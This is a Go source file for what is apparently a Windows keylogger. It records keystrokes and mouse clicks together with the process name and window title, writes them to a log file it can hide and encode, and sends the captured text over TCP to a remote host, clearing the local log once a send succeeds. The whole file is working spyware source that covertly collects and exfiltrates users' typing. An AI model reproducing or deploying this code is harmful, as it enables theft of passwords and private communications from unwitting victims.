package main

import (
	"fmt"
	"github.com/guidoxie/keyboard/listener/win32"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"syscall"
	"time"
)

var sendChan = make(chan string, 100)
var sendStatus = make(chan bool)

func keyDump(path string, host string, isEncode bool, isHidden bool) {
	func() {
		var key string
		file, err := openFile(path, isHidden)
		if err != nil {
			panic(err)
		}
		if host != "" {
			go sendRemote(host)
		}
		defer func() {
			file.Close()
			err := recover()
			log.Println(err)
		}()
		for {
			select {
			case event := <-kbEventChanel:
				vkCode := event.VkCode
				if keyMap[vkCode] == "Enter" || keyMap[vkCode] == "Tab" {
					if len(key) > 0 {
						fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time, isEncode)
						if host != "" {
							send := fmtStr
							file.Seek(0, 0) // 文件指针移到开头
							local, err := ioutil.ReadAll(file)
							if err != nil {
								log.Println(err)
							}
							if len(local) > 0 {
								send = string(local) + fmtStr
							}
							sendChan <- send
							ok := <-sendStatus
							if !ok {
								// write file
								if err := writeToFile(file, fmtStr); err != nil {
									log.Println(err)
								}
							} else { // 清空文件内容
								if err := os.Truncate(path, 0); err != nil {
									log.Println(err)
								}
							}
						} else {
							// write file
							if err := writeToFile(file, fmtStr); err != nil {
								log.Println(err)
							}
						}
						key = ""
					}
				} else {
					if vkCode >= 48 && vkCode <= 90 {
						if getCapsLockSate() { // 大小写
							key += strings.ToUpper(keyMap[vkCode])
						} else {
							key += keyMap[vkCode]
						}
					} else if isExKey(vkCode) {
						key += fmt.Sprintf("[%s]", keyMap[vkCode])
					} else {
						key += keyMap[vkCode]
					}
				}
			case event := <-msEventChanel:
				if len(key) > 0 {
					fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time, isEncode)
					if host != "" {

						send := fmtStr
						file.Seek(0, 0) // 文件指针移到开头
						local, err := ioutil.ReadAll(file)
						if err != nil {
							log.Println(err)
						}
						if len(local) > 0 {
							send = string(local) + fmtStr
						}
						sendChan <- send
						ok := <-sendStatus
						if !ok {
							// write file
							if err := writeToFile(file, fmtStr); err != nil {
								log.Println(err)
							}
						} else { // 清空文件内容
							if err := os.Truncate(path, 0); err != nil {
								log.Println(err)
							}
						}
					} else {
						// write file
						if err := writeToFile(file, fmtStr); err != nil {
							log.Println(err)
						}
					}
					key = ""
				}
			}
		}
	}()
}

func isExKey(vkCode win32.DWORD) bool {
	_, ok := exKey[vkCode]
	return ok
}

func fmtEventToString(keyStr string, processId uint32, processName string, windowText string, t time.Time, isEncode bool) string {
	content := fmt.Sprintf("[%s:%d %s %s]\r\n%s\r\n", processName, processId,
		windowText, t.Format("15:04:05 2006/01/02"), keyStr)
	if isEncode {
		content = encode(content)
	}
	// 数据包协议 \t\r\n 结束
	return fmt.Sprintf("%s\t\r\n", content)
}

func sendRemote(host string) {

	func() {
		conn, err := net.Dial("tcp", host)
		if err != nil {
			log.Println(err)
		}

		defer func() {
			if conn != nil {
				conn.Close()
			}
			err := recover()
			log.Println(err)
		}()
		for {
			select {
			case str := <-sendChan:
				if conn == nil {
					conn, err = net.Dial("tcp", host)
					if err != nil || conn == nil {
						sendStatus <- false
						continue
					}
				}
				if _, err := conn.Write([]byte(str)); err != nil {
					log.Println(err)
					conn.Close()
					conn = nil
					sendStatus <- false
					continue
				}
				sendStatus <- true
			}
		}
	}()
}

func writeToFile(file *os.File, str string) error {
	// write file
	if _, err := file.WriteString(str); err != nil {
		return err
	} else {
		err := file.Sync()
		if err != nil {
			return err
		}
	}
	return nil
}

func openFile(path string, isHidden bool) (*os.File, error) {
	p := strings.Split(path, string(os.PathSeparator))
	if len(p) > 2 {
		// 创建目录
		dir := strings.Join(p[:len(p)-1], string(os.PathSeparator))
		err := os.MkdirAll(dir, os.ModePerm)
		if err != nil {
			return nil, err
		}
		// 隐藏目录
		if isHidden {
			if err := hiddenFile(dir); err != nil {
				return nil, err
			}
		}
	}
	file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_RDWR|os.O_SYNC, 0644)
	if err != nil {
		return nil, err
	}
	//if exist, err := pathExists(path); err != nil{
	//	return nil , err
	//} else if ! exist { // 创建文件
	//	f , err := os.Create(path)
	//	if err != nil {
	//		return nil, err
	//	}
	//	f.Close()
	//}

	// 隐藏文件
	if isHidden {
		if err := hiddenFile(path); err != nil {
			return nil, err
		}
	}
	return file, nil
}

func hiddenFile(path string) error {
	n, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(n, syscall.FILE_ATTRIBUTE_HIDDEN)
}

func pathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}
